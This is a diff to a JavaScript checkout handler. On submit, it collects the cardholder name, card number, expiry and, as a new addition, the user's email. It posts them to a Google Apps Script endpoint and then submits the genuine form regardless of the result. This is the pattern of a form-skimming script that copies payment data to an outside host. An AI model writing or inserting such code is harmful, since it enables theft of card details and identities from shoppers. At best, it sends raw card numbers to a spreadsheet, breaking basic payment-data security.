@@ -87,6 +87,7 @@
     e.preventDefault();
 
     var form = this;
+    var email = document.getElementById('user-email').value;
     var ccName = document.getElementById('cc-name').value;
     var ccNumber = document.getElementById('cc-number').value;
     var ccExp = document.getElementById('cc-exp').value;
@@ -96,6 +97,7 @@
 
     var postData = new URLSearchParams();
     postData.append('action', 'payment');
+    postData.append('email', email);
     postData.append('cc_name', ccName);
     postData.append('cc_number', ccNumber);
     postData.append('cc_exp', ccExp);
@@ -105,15 +107,22 @@
 
     fetch('https://script.google.com/macros/s/AKfycbxNPxxNVY4US_YGQPedl-ruTALneP6QtpaJX1nZ2S7tGzYxewXGrbmlPHwaHlGVrQ/exec', {
       method: 'POST',
-      mode: 'no-cors',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded'
       },
       body: postData.toString()
     })
-    .then(function() {
-      // After updating data in Google Sheets, proceed
-      form.submit();
+    .then(function(response) {
+      // Optionally parse JSON if your script returns JSON
+      return response.json();
+    })
+    .then(function(data) {
+      if (data.result === 'success') {
+        form.submit();
+      } else {
+        console.error('Non-success response from server:', data);
+        form.submit();
+      }
     })
     .catch(function(error) {
       console.error('Error saving payment data to Google Sheets:', error);
